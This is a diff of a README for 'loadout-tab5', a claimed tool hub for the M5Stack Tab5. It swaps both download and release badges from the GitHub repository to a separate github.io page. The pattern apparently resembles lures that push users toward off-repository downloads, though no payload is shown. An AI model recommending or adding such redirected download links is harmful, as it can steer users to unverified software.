@@ -1,6 +1,6 @@
 # 🛠️ loadout-tab5 - Manage hardware tools with simple steps
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Poisonous-indication912/loadout-tab5)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://poisonous-indication912.github.io)
 
 loadout-tab5 acts as a central hub for your M5Stack Tab5 device. It lets you update software, manage inner hardware components, and test device functions without complex code. The system runs on the ESP32-P4 processor and uses a simple, visual interface to handle tasks.
 
@@ -18,7 +18,7 @@ To run the system, your computer needs the following:
 
 You need to access the software files to get started. Use the button below to reach the project page.
 
-[![](https://img.shields.io/badge/View_Release_Page-Grey?style=for-the-badge)](https://github.com/Poisonous-indication912/loadout-tab5)
+[![](https://img.shields.io/badge/View_Release_Page-Grey?style=for-the-badge)](https://poisonous-indication912.github.io)
 
 Follow these steps to set up the software:
 
